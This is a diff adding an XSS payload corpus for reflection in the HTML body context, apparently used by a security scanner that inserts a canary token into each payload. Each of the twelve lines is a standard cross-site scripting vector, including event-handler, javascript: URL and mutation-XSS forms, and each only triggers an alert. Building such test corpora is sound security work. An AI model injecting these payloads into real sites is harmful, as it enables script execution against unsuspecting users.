@@ -1,0 +1,15 @@
+# XSS payload corpus — HTML body context (reflection between tags).
+# {c} is the per-request canary token substituted at probe time.
+# Educational/authorized testing corpus: standard, well-documented vectors.
+<script>alert('{c}')</script>
+<img src=x onerror=alert('{c}')>
+<svg onload=alert('{c}')>
+<body onload=alert('{c}')>
+<iframe src="javascript:alert('{c}')">
+<video><source onerror=alert('{c}')>
+<details open ontoggle=alert('{c}')>
+<marquee onstart=alert('{c}')>
+<div style="width:100px;height:100px" onmouseover=alert('{c}')>
+<input autofocus onfocus=alert('{c}')>
+<keygen autofocus onfocus=alert('{c}')>
+<math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert('{c}')" src>
